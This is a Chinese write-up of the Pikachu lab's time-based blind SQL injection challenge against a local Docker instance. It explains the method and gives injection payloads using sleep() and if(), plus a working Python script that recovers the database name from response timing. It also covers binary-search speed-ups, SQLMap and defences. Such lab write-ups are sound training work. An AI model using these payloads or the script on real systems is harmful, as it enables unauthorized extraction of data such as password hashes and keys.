一、题目信息

  • 题目名称：SQL-Inject 盲注(base on time)
  • 题目平台：Pikachu 漏洞练习平台
  • 题目类型：Web安全 / SQL注入 / 时间盲注 / 脚本自动化
  • 靶场链接：http://localhost:8080/vul/sqli/sqli_blind_t.php（本地 Docker 环境）
  • 涉及工具：浏览器（Chrome/Firefox）、Python 3、requests 库、终端

二、解题步骤

1. 分析题目考什么

本题的核心考点是时间盲注（Time-Based Blind SQL Injection）。在布尔盲注中，页面会根据真假呈现不同状态；但在时间盲注中，无论输入什么，页面的显示永远一样（既没有数据回显，也没有状态差异）。攻击者必须利用数据库的延时函数（如 sleep()），结合逻辑判断（if()），通过观察服务器响应的时间差来推断 SQL 条件是否成立，从而逐字符提取数据。

2. 怎么想（破题思路）

页面只提供了一个用户名查询框，且没有任何状态变化。解题思路如下：

  • 手动测试延时。输入 kobe' and sleep(5) #，观察页面是否卡顿 5 秒才刷新。如果卡顿，说明漏洞存在。
  • 因为无法直接回显数据，构造带条件判断的延时语句：if(ascii(substr(database(),1,1))=112, sleep(3), 0)。这表示“如果数据库名第一个字符是 p（ASCII 112），就睡 3 秒”。
  • 遍历字符位置和 ASCII 码范围，通过 Python 脚本测量每次 HTTP 请求的耗时，自动还原数据。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：网络波动导致时间差误判

踩坑情况：在脚本中设定 sleep(1)，结果某些请求因为网络抖动卡顿了 1.5 秒，导致脚本误以为条件成立，最终拼凑出的数据库名是乱码。

原因分析：时间盲注依赖于响应时间的精确测量。网络延迟、服务器负载波动都会影响实际响应时间，导致误报。

改进方式：适当增大 sleep() 的值（如 3 秒或 5 秒），并在 Python 脚本中增加时间判断阈值，如 if (end_time - start_time) >= 3:，以抗住网络抖动。

踩坑记录二：线性遍历导致爆破时间过长

踩坑情况：脚本使用 range(32,127) 遍历 ASCII 码，每次都要发送请求。因为每个请求都要等 sleep(3)，猜一个字符最多需要等 3 x 95 = 285 秒，爆破出 7 个字符的数据库名耗时巨大。

原因分析：时间盲注的成本在于每次请求必须等待延时生效，线性遍历时间成本极高。

改进方式：实战中应改用二分查找法（Binary Search）。例如先问 ascii > 100，如果为真，再问 ascii > 115，最多 7 次请求即可确定一个字符，大幅提升效率。

终极解法：Python 脚本自动化时间盲注

在桌面创建 time_sqli.py，编写并执行以下代码：

import requests
import time

url = "http://localhost:8080/vul/sqli/sqli_blind_t.php"
result = ""

for i in range(1, 21):
    for j in range(32, 127):
        # 核心逻辑：如果是正确的字符，就睡 3 秒；否则立即返回
        payload = f"kobe' and if(ascii(substr(database(),{i},1))={j}, sleep(3), 0) #"
        params = {"name": payload, "submit": "查询"}
        
        start_time = time.time()
        res = requests.get(url, params=params)
        end_time = time.time()
        
        # 如果响应时间大于 3 秒，说明猜对了
        if (end_time - start_time) >= 3:
            result += chr(j)
            print(f"当前猜解结果: {result}")
            break

print(f"最终结果: {result}")

代码逐个符号深度解析：

  • import time：导入 Python 的时间模块，用于获取时间戳和计算时间差。
  • for i in range(1, 21)：外层循环，假设数据库名长度不超过 20 个字符，从第 1 个字符开始猜。
  • for j in range(32, 127)：内层循环，遍历可打印 ASCII 码范围（32 到 126）。
  • payload = f"kobe' and if(ascii(substr(database(),{i},1))={j}, sleep(3), 0) #"：核心 Payload。
    • kobe'：闭合原 SQL 语句的引号。
    • and：逻辑与，要求两边都为真。
    • if(条件, 真执行, 假执行)：MySQL 的控制流函数。
    • ascii(substr(database(), {i}, 1))={j}：判断数据库名的第 i 个字符的 ASCII 码是否等于 j。
    • sleep(3)：条件为真时，延迟 3 秒执行。
    • 0：条件为假时，立即返回 0，不延迟。
    • #：注释掉 SQL 语句末尾原本的引号。
  • start_time = time.time()：记录发送请求前的时间戳。
  • res = requests.get(url, params=params)：发送 HTTP GET 请求并获取响应。
  • end_time = time.time()：记录请求返回后的时间戳。
  • if (end_time - start_time) >= 3:：计算请求耗时。如果耗时大于等于 3 秒，说明 sleep(3) 被执行了，即条件判断为真。
  • result += chr(j)：将 ASCII 码 j 转换为字符，拼接到结果中。

执行脚本后，经过一段时间的等待，终端成功打印出数据库名为 pikachu，证明时间盲注攻击成功。

4. 怎么迁移（跨领域联想）

  • 时序攻击（Timing Attacks）：时间盲注本质上是一种侧信道攻击（Side-Channel Attack）。在密码学中，如果密码比对函数使用了非恒定时间的比较算法（如遇到不同字符立即返回），攻击者可以通过测量比对耗时，逐位猜测出正确的密码。
  • 自动化渗透工具（SQLMap）：SQLMap 等自动化工具在处理时间盲注时，内部会使用复杂的统计学模型来消除网络波动带来的误判，并采用二分查找加快爆破速度。理解本题的原理，是掌握 SQLMap 高级用法的基础。
  • 安全开发与代码审计：防止时间盲注的根本手段依然是参数化查询。如果在日志中看到某个 IP 在短时间大量发送带有 sleep 特征的请求，WAF 和 IDS 应当立即进行拦截和封禁。

三、名词大全与原理深度复盘

1. 时间盲注（Time-Based Blind SQL Injection）

指服务器不返回数据、不返回错误，也没有布尔状态差异的注入场景。攻击者通过构造逻辑判断和延时函数，让数据库在条件为真时执行延时操作，通过观察 HTTP 响应的延迟时间，来推断 SQL 条件是否成立。它是盲注中危害最大、利用难度最高的一种。

2. MySQL 中的 IF() 函数与 SLEEP() 函数

IF(condition, value_if_true, value_if_false) 是 MySQL 的条件判断函数。SLEEP(seconds) 用于让数据库暂停执行指定的秒数。两者结合，即可实现“条件为真则延时”的盲注逻辑。

3. 为什么时间盲注效率极低？

因为每次请求都必须等待延时函数执行完毕才能获得结果。假设延时 3 秒，猜一个字符需要遍历 95 个 ASCII 码，最坏情况需要 285 秒。如果是 20 个字符的数据库名，可能需要数小时。因此，实战中必须使用二分查找优化，或者使用 SQLMap 等成熟工具。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与布尔盲注相比：布尔盲注可以通过页面回显的“正常/异常”来判断真假；时间盲注连状态都不改变，只能依靠时间差。时间盲注的适用场景更极端，但利用成本也更高。
  • 与报错注入相比：报错注入依赖数据库主动抛出错误信息，若开发者关闭了错误回显（如 display_errors = Off），报错注入将失效，此时时间盲注是最后的选择。

2. 这种题目的出现原因（为什么存在）

这类漏洞的出现，是因为后端虽然使用了参数化查询以外的拼接方式，但开发者对页面进行了严格的容错处理，既没有展示数据，也没有回显报错。这种“什么反馈都没有”的状态，逼迫攻击者只能通过服务器的时间差来侧信道获取信息。

3. 这种应用在实际中如何体现？

在实际的安全演练中，时间盲注常被用于探测那些防御较为严密、无回显的接口。安全工程师通过编写脚本或使用 SQLMap，利用时间差获取数据库中的管理员密码哈希、API 密钥等敏感信息，整个过程在悄无声息中完成。

4. 如何抽象理解概念（大白话理解）

如果把数据库比作一个被蒙住眼睛、堵住嘴巴的哑巴：

  • 普通注入：你问“你叫什么名字？”，哑巴说不出话，会把名字写在纸上递给你（回显）。
  • 布尔盲注：哑巴不能写，但他能点头或摇头。你问“你第一个字是 p 吗？”，他点头或摇头（页面 True/False）。
  • 时间盲注：哑巴既不能写，也不能点头。你问“你第一个字是 p 吗？如果是，你就沉默 3 秒钟；如果错，你就立刻拍一下桌子”。你拿着秒表在旁边计时。如果他沉默 3 秒，你就知道答对了。
  • 总结：时间盲注就是利用“沉默的时间”来传递信息。这个过程极其耗时，所以必须要写 Python 脚本帮你拿着秒表，不断向哑巴提问。
